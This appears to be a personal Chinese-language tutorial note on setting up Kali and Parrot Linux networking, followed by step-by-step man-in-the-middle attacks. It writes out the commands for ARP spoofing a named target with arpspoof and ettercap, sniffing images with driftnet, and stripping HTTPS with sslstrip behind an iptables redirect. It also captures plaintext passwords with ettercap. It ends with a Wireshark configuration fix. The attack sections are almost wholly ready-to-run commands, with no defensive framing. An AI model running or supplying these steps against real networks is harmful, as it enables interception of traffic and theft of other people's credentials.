#ARP欺骗
##1.Kali的网络配置
> **上网方式**
   1.桥接   （宽带下不可用！！！）

***虚拟机与主机在同一个网段中***，并且也要为虚拟机分配一个IP地址（不要与主机IP地址相同，也不要与主机所在局域网中的其他计算机IP地址相同），为虚拟机设置子网掩码、网关地址、DNS地址。除了IP地址不同，其他都相同。
> 2.NAT

虚拟机使用“NAT”（即VMnet8）虚拟网卡，并且在虚拟机中设置为“自动获得地址”，虚拟机就可以上网

> **网络故障问题的解决方法**
> 
>1.查看自己ip地址、子网掩码等信息

    ifconfig 
如不显示inet地址，则可能是smbd.server没开，应输入
     
    /etc/init.d/smbd start
或输入

	dhclient eth0
命令来获取IP地址
再输入ifconfig命令，就能看到eth0已经有IP地址了



> 2.配置网络

    vi /etc/network/interfaces

修改为如下形式
            #This file describes the network interfaces available on your system             
            # and how to activate them. For more information, see interfaces(5).
 
            # The loopback network interface
             auto lo
             iface lo inet loopback
 
            # The primary network interface
            allow-hotplug eth0
            iface eth0 inet static                //配置eth0使用默认的静态地址
            # address 192.168.0.133        //设置eth0的IP地址
            # netmask 255.255.255.0          //配置eth0的子网掩码
            # gateway 192.168.0.254        //配置当前主机的默认网关
              waddress ether 00:50:56:3D:9E:D2      //配置MAC地址

修改文件夹内文本数据时用vi命令，i键进入修改模式，修改后按ESC退出修改模式，输入 ：w 保存，输入 ：q 退出文件
> 配置DNS

Kali Linux的DNS服务器地址使用文件“/etc/resovl.conf”进行配置，用户可以通过“nameserver”配置项设置DNS服务器的 IP地址；
“resolv.conf”文件中最多可以使用“nameserver”指定３个DNS服务器，按照先后的顺序，一旦前面的DNS服务器失效，系统将自动使用后面的DNS服务器。
对于“resolv.conf”文件设置“nameserver”的修改是即时生效的，即只要对“resolv.conf”文件的修改进行了保存，在系统下一次需要进行域名的解析时就会按照该文件中指定的DNS服务器IP地址进行域名的解析。

           vi /etc/resovl.conf
修改格式如下
         # Generated by NetworkManager
         nameserver 192.168.229.2     //Nat模式下为虚拟机网卡IP，桥接模式下为主机分配的IP
         nameserver 114.114.114.114
         nameserver 8.8.8.8
> 重启网卡

         /etc/init.d/networking restart
> ping

      ping 114.114.114.114
      ping 8.8.8.8


##2.ARP欺骗方法
> nmap扫描内网主机

       nmap -sP 192.168.0.0/24

查看目标主机操作系统信息
       
      nmap -O 192.168.0.133
> 开启流量转发功能

    echo 1 >> /proc/sys/net/ipv4/ip_forward

> 使用arpspoof或ettercap，选一个进行arp欺骗。获取从192.168.0.1（路由器） 到 192.168.0.21（目标机）的流量。

使用arpspoof（无线网络下，有线网络则先ip，后网关）：

          arpspoof -i eth0 -t 192.168.1.1(网关) 192.168.1.*(ip)
          arpspoof -i eth0 -t 192.168.0.1  192.168.0.21

使用ettercap：

     ettercap -T -q -M ARP /192.168.0.21// ///

> driftnet图片流量监控

     driftnet -i eth0








#SSLstrip（利用parrot）#
##1.parrot配置##
> parrot的软件安装

          apt-get install 工具名
          apt-get install parrot-tools-full  
                                  //将装入full版parrot

更换更新源
        vi /etc/apt/sources.list.d/parrot.list

中科大源
        #stable repository
        deb http://mirrors.ustc.edu.cn/parrot/ parrot main contrib non-free
        #deb-src http://mirrors.ustc.edu.cn/parrot/ parrot main contrib non-free
清华源
        #stable repository
        deb http://mirrors.tuna.tsinghua.edu.cn/parrot/ parrot main contrib non-free
        #deb-src http://mirrors.tuna.tsinghua.edu.cn/parrot/ parrot main contrib non-free

安装VMtools

        sudo apt-get update
        sudo apt-get install open-vm-tools-desktop fuse
        然后重新登录
         
> parrot网络配置

同kali（vim出现某些问题，需到相应路径下以管理员身份打开）

> 流量转发（以下需在root模式下）

           echo 1 > /proc/sys/net/ipv4/ip_forward

> 配置路由表(iptables),把80端口的数据传送到8080端口,也就是SSL欺骗需要监听的端口

      iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

> 显示网关地址

           route -n

> nmap

                 nmap -sP [网关地址]/24
> 欺骗

            arpspoof -i [网卡] -t [目标ip] [网关ip]
            arpspoof -i eth0 -t 192.168.1.100 192.168.0.1

在使用arpspoof进行流量转发的时候

如果目标机器是使用无线连接的网络,则需要反向转发，即先网关，后ip

命令应该为:

        arpspoof -i eth0 -t 192.168.1.1(网关) 192.168.1.*(ip)
> 监听

           sslstrip -l 8080
> 查看报文

           cat sslstrip.log
> 实时截获http明文传输的密码

      ettercap -Tq -i eth0


#Wireshark报错解决方案

解决方案：修改init.lua

直接运行wireshark的话会报错：

Lua: Error during loading:
[string "/usr/share/wireshark/init.lua"]:45: dofile has been disabled

要对其进行修改，终端运行


      sudo vi /usr/share/wireshark/init.lua
倒数第二行原来为：dofile(DATA_DIR.."console.lua")

改为     
          
      --dofile(DATA_DIR.."console.lua")